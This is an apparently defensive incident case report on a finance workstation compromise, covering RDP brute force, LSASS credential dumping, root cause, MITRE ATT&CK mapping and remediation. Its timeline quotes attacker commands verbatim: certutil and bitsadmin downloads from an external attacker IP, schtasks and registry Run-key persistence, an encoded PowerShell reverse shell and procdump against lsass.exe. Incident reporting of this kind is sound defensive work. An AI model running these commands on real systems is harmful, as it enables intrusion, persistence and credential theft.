# Incident Case Report: INC-2026-0814

**Incident Title:** External Brute-Force to Endpoint Compromise and LSASS Memory Credential Dumping  
**Project Code:** `CDL-DET-V2`  
**Incident ID:** `INC-2026-0814`  
**Date of Incident:** 2026-08-14  
**Severity Rating:** **CRITICAL** (P1)  
**Assigned Lead Analyst:** Abhijeet Amarnath Sharma - Senior Detection Engineer & IR Lead  
**Incident Status:** Closed - Remediated  
**Closure Classification:** **True Positive (Confirmed Host & Credential Compromise)**  

---

## 1. Executive Summary & Impact Assessment

On August 14, 2026, the Cyberion Defense Labs Security Operations Center (SOC) detected an aggressive multi-stage intrusion sequence targeting finance workstation **`WS-FIN-04.cyberion.local`** (`10.20.1.15`).

An external adversary operating from IP address **`185.220.101.45`** conducted automated credential guessing against externally accessible Remote Desktop Protocol (RDP) services. Following three failed attempts, the adversary successfully authenticated against domain user account **`CYBERION\j.doe`**.

Upon gaining interactive access, the attacker executed an obfuscated Base64 PowerShell reverse shell, conducted local privilege discovery, staged binary payloads via Living-off-the-Land utilities, established persistence via scheduled tasks and registry Run keys, and executed two memory access attempts against the Local Security Authority Subsystem Service (**`lsass.exe`**) to dump active Active Directory credentials.

### Impact Summary
* **Compromised Endpoints:** `WS-FIN-04.cyberion.local` (10.20.1.15).
* **Compromised User Accounts:** `CYBERION\j.doe` (Workstation User), `CYBERION\svc_backup` (Service Account).
* **Data & Credential Exposure:** High. Memory extraction of `lsass.exe` exposed cleartext Kerberos tickets, NTLM hashes for all users with active interactive sessions on `WS-FIN-04`, and local administrator credentials.
* **Operational Disruption:** Workstation isolated from the network for 4 hours; no data wiping or ransomware execution occurred prior to SOC containment.

---

## 2. Incident Timeline Reconstruction

All events reconstructed from `datasets/windows_security_sysmon_sample.json` and correlated network logs:

```text
08:04:00 UTC ──> 08:05:12 UTC ──> 08:06:00 UTC ──> 08:07:00 UTC ──> 08:08:00 UTC ──> 08:11:00 UTC
   Failed           RDP Logon        PowerShell       Certutil &       Persistence      LSASS Memory
 RDP Brute          Success           Reverse         Bitsadmin        Task & Run Key      Dumping
  (3x 4625)         (EID 4624)         Shell          Downloads          Creation        (Sysmon 10)
```

| Timestamp (UTC) | Log Source | Event ID / Type | Actor / Process | Activity Description | Telemetry Evidence |
| :--- | :--- | :---: | :--- | :--- | :--- |
| **08:04:00.000Z** | Security | `4625` | `185.220.101.45` | RDP Brute Force Attempt 1 | `TargetUserName: j.doe, LogonType: 10, Status: 0xC000006D` |
| **08:04:18.000Z** | Security | `4625` | `185.220.101.45` | RDP Brute Force Attempt 2 | `TargetUserName: j.doe, LogonType: 10, Status: 0xC000006D` |
| **08:04:36.000Z** | Security | `4625` | `185.220.101.45` | RDP Brute Force Attempt 3 | `TargetUserName: j.doe, LogonType: 10, Status: 0xC000006D` |
| **08:05:12.000Z** | Security | `4624` | `185.220.101.45` | Successful RDP Interactive Logon | `TargetUserName: j.doe, LogonType: 10, Workstation: WS-FIN-04` |
| **08:06:00.000Z** | Sysmon | `1` | `powershell.exe` | Obfuscated Reverse Shell Spawned | `powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABj...` |
| **08:06:06.000Z** | Security | `4688` | `powershell.exe` | Process Creation Auditing Log | Matches Sysmon PID 7788 connecting to `185.220.101.45:443` |
| **08:06:30.000Z** | Security | `4688` | `whoami.exe` | Privilege Enumeration Discovery | `whoami /priv` (Parent: `cmd.exe`, PID 7200) |
| **08:07:00.000Z** | Security | `4688` | `certutil.exe` | Ingress Tool Staging (Payload) | `certutil.exe -urlcache -split -f http://185.220.101.45/payload.exe C:\Users\j.doe\AppData\Local\Temp\svchost32.exe` |
| **08:07:30.000Z** | Security | `4688` | `bitsadmin.exe` | Ingress Tool Staging (DLL) | `bitsadmin /transfer svcupdate /download /priority high http://185.220.101.45/update.dll C:\Windows\Temp\update.dll` |
| **08:08:00.000Z** | Security | `4688` | `schtasks.exe` | Elevated Persistence Creation | `schtasks /create /sc MINUTE /mo 5 /tn "WindowsUpdate" /tr "C:\Windows\Temp\update.dll" /ru SYSTEM /f` |
| **08:08:30.000Z** | Security | `4688` | `reg.exe` | Registry Run Key Persistence | `reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v WindowsSvcHost /t REG_SZ /d "C:\Windows\Temp\update.dll" /f` |
| **08:11:00.000Z** | Sysmon | `10` | `rundll32.exe` | LSASS Memory Access (`0x1010`) | `SourceImage: rundll32.exe, TargetImage: lsass.exe, GrantedAccess: 0x1010 (VM_READ)` |
| **08:11:30.000Z** | Sysmon | `10` | `procdump64.exe` | Full LSASS Memory Dump (`0x1fffff`) | `SourceImage: C:\Windows\Temp\procdump64.exe, Target: lsass.exe, GrantedAccess: 0x1fffff` |

---

## 3. Root Cause Analysis (RCA)

Using the "Five Whys" methodology:
1. **Why was LSASS memory compromised?**  
   The adversary executed `procdump64.exe` and `rundll32.exe` with administrative rights on `WS-FIN-04`.
2. **Why did the adversary have administrative rights on `WS-FIN-04`?**  
   The user account `CYBERION\j.doe` belonged to the local Administrators group on the finance workstation, and persistence had been escalated to `SYSTEM` via scheduled tasks.
3. **Why was `j.doe`'s account compromised?**  
   The user utilized a weak, dictionary-based password that was vulnerable to external brute-force guessing.
4. **Why was an internal workstation accessible to external brute-force attacks?**  
   Direct inbound RDP (TCP 3389) port forwarding was temporarily configured on the edge firewall for remote work without requiring an MFA-backed VPN or Remote Desktop Gateway.
5. **Root Cause:** Insecure remote access boundary exposure (exposed RDP without MFA) compounded by poor password hygiene and local administrative privileges assigned to standard corporate users.

---

## 4. MITRE ATT&CK Framework Mapping

| Tactic | Technique ID | Technique Name | Exploited Artifact / Procedure |
| :--- | :--- | :--- | :--- |
| **Initial Access** | `T1110.001` | Brute Force: Password Guessing | 3 failed RDP logons followed by success on port 3389 |
| **Initial Access** | `T1078` | Valid Accounts | Interactive logon via compromised `CYBERION\j.doe` credentials |
| **Execution** | `T1059.001` | Command and Scripting: PowerShell | Base64-encoded reverse shell connecting to external listener |
| **Execution** | `T1053.005` | Scheduled Task/Job: Scheduled Task | Scheduled task `WindowsUpdate` running `update.dll` every 5m |
| **Persistence** | `T1547.001` | Boot or Logon Autostart: Run Keys | Addition of `WindowsSvcHost` under `CurrentVersion\Run` |
| **Defense Evasion** | `T1027` | Obfuscated Files or Information | Base64 command encoding and binary masquerading (`svchost32.exe`) |
| **Credential Access** | `T1003.001` | OS Credential Dumping: LSASS Memory | Sysmon Event 10 open process handle to `lsass.exe` with `0x1010` and `0x1fffff` |

---

## 5. Containment, Eradication & Remediation Actions Taken

### 5.1 Immediate Containment (Executed at 08:15 UTC)
* **Host Isolation:** Issued EDR network isolation command to `WS-FIN-04`.
* **Account Revocation:** Disabled `CYBERION\j.doe` and `CYBERION\svc_backup` in Active Directory.
* **Perimeter Blocking:** Terminated active external TCP connections and blocked `185.220.101.45` on edge firewalls.
* **Session Termination:** Issued Kerberos Golden Ticket / TGT reset (`krbtgt` password doubled reset initiated as precaution).

### 5.2 Eradication (Executed at 09:30 UTC)
* Deleted malicious persistence task: `schtasks /delete /tn "WindowsUpdate" /f`.
* Deleted registry autostart entry: `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WindowsSvcHost`.
* Securely removed staged payloads: `C:\Windows\Temp\update.dll`, `C:\Windows\Temp\procdump64.exe`, `C:\Users\j.doe\AppData\Local\Temp\svchost32.exe`, and memory dump files `*.dmp`.

### 5.3 Post-Incident Hardening & Lessons Learned
1. **Enforce MFA on all Remote Access:** Prohibit direct external RDP exposure; require zero-trust Network Access (ZTNA) or VPN with Duo/Microsoft MFA.
2. **Implement LAPS (Local Administrator Password Solution):** Deprecate standard user membership in local Administrators; randomize all local admin passwords.
3. **Enable Credential Guard:** Deploy Windows Defender Credential Guard to isolate LSASS secrets in virtualized VBS memory, neutralizing `procdump` and `mimikatz` memory scraping.
4. **Rule Enhancements:** Production Sigma rules `sigma_win_brute_force_to_success_correlation.yml` and `sigma_win_lsass_memory_dump_access.yml` verified in Phase 2 actively protect against this kill-chain progression.
